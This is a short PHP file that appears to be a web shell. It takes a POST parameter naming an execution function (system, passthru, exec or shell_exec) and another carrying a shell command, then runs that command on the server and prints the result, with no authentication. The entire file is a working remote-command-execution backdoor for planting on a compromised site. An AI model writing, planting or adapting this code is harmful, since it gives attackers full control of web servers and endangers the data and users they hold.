<?php
$execfunc = $_POST['execfunc'];
if ($execfunc=="system") {
	system($_POST['command']);
} elseif ($execfunc=="passthru") {
	passthru($_POST['command']);
} elseif ($execfunc=="exec") {
	$result = exec($_POST['command']);
	echo $result;
} elseif ($execfunc=="shell_exec") {
	$result=shell_exec($_POST['command']);
	echo $result;	
} 
		
?>